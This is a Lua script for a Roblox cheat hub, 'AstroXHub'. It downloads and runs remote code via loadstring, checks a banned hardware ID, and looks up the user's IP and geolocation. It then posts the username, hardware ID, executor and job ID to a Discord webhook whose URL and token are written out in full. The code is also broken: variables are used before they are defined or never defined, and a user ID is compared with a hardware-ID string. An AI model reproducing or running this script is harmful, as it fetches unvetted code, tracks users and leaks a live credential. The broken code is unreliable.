local Alert = loadstring(game:HttpGet("https://raw.githubusercontent.com/AstroXTeam/Project-/refs/heads/main/Alert"))()
Alert:create("Webhook Is Enabled!")
local bannedHWID = "BBA60FA6-18A4-48E2-8100-1672FD847C2E"
local function checkAndKickPlayer()
    local player = game:GetService("Players").LocalPlayer
    local playerHWID = player.UserId
    if playerHWID == bannedHWID then
        player:Kick("You Have Been Banned From AstroXHub To Unban Come to Telegram \n لقد تم تبنيدك من سكربت استرو اكس لحل مشكله تعال التليكرام \n تم نسخ رابط • Copy telegram link")
    end
end    
checkAndKickPlayer()
local Players = game:GetService("Players")
local Name = LocalPlayer.Name

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

local playerCount = #game:GetService("Players"):GetPlayers()
local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ExecutorUsing = identifyexecutor()
local HttpService = game:GetService("HttpService")
local Data =
{
    ["embeds"] = {
        {
            ["title"] = "Detect Account",
            ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId,
            ["description"] = "```"..game.Players.LocalPlayer.DisplayName.." ```",
            ["color"] = tonumber("0xf7c74b"),
            ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1277112182743629969/1277337544463224898/Picsart_24-08-26_01-42-34-420.png?ex=66ccccca&is=66cb7b4a&hm=80a0165401d2357f1386cfa88da35a3df2427c1186b0e8b7955272f6c5f6ead9&"},
            ["fields"] = {
            	{
                    ["name"] = "username:",
                    ["value"] = Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Execute:",
                    ["value"] = "```"..ExecutorUsing.."```",
                    ["inline"] = true
                },
                {
                    ["name"] = "Hwid:",
                    ["value"] = hwid,
                    ["inline"] = true
                },
                
                {                
                    ["name"] = "Time:",
                    ["value"] = tostring(os.date("%X")),
                    ["inline"] = true
                },
        
                {                
                    ["name"] = "Job ID:",
                    ["value"] = " " .. jobId,
                    ["inline"] = true
                },
                
                {
                    ["name"] = "Ty For Use:",
                    ["value"] = "**__AstroXHub__**",
                    ["inline"] = true          
                }
            }              
        }
    }
}
local Headers = {["Content-Type"] = "application/json"}
local Encoded = HttpService:JSONEncode(Data)
local Request = http_request or request or HttpPost or syn.request
local Final = {Url = "https://discord.com/api/webhooks/1290720995774169171/ihPompE08lQlCEN_PwYIZW8dHkCGJYID3RbQFBIzRdXyqdahKSjGOdkFK1ymLycPm4fr", Body = Encoded, Method = "POST", Headers = Headers}
Request(Final)
